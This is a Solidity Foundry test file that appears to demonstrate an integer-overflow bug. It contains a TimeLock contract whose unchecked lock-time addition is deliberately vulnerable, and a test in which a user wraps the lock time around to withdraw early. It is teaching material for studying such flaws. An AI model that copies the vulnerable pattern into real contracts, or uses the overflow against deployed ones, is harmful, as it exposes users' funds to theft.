// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "lib/forge-std/src/Test.sol";

//=====================================================================================
contract TimeLock {
    mapping(address => uint) public balances;
    mapping(address => uint) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
    }

    function increaseLockTime(uint _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease; // vulnerable
    }

    function withdraw() public {
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
//=====================================================================================


//=====================================================================================
contract ContractTestOverflow1 is Test {
    TimeLock TimeLockContract;
    address bob;

    function setUp() public {
        TimeLockContract = new TimeLock();
        bob = vm.addr(1); 
        vm.deal(bob, 1 ether);
    }    
           
    function testFailOverflow() public {
        console.log("Bob balance", bob.balance);


        console.log("Bob deposit 1 Ether...");
        vm.startPrank(bob); 
        TimeLockContract.deposit{value: 1 ether}();
        console.log("Bob balance", bob.balance);

        // exploit here
        TimeLockContract.increaseLockTime(
            type(uint).max + 1 - TimeLockContract.lockTime(bob)
        );
        console.log("lockTime Bob", TimeLockContract.lockTime(bob));


        console.log("Bob will successfully to withdraw, because the lock time is overflowed");
        TimeLockContract.withdraw();
        console.log("Bob balance", bob.balance);
        vm.stopPrank();
    }
}
//=====================================================================================
